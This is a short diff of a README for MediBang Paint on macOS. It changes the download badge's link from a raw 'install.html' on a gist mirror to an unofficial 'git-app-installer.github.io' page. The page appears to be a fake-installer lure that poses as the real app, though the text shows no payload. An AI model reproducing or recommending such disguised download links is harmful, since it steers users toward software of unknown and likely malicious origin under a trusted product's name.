@@ -2,7 +2,7 @@
 
 MediBang Paint for macOS is a free digital painting and manga creation software that offers a wide range of tools and features for artists and illustrators.
 
-<a href="https://gistcdn.githack.com/russianboynard/fc94932a6c86aa4d0f052c3de63bc8bf/raw/19b4c3eb91c854b3e5246c495bc7ab3637b2af39/install.html?offer=MediBang%20Paint" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=MediBangPaint" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20MediBang%20Paint%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="340" 
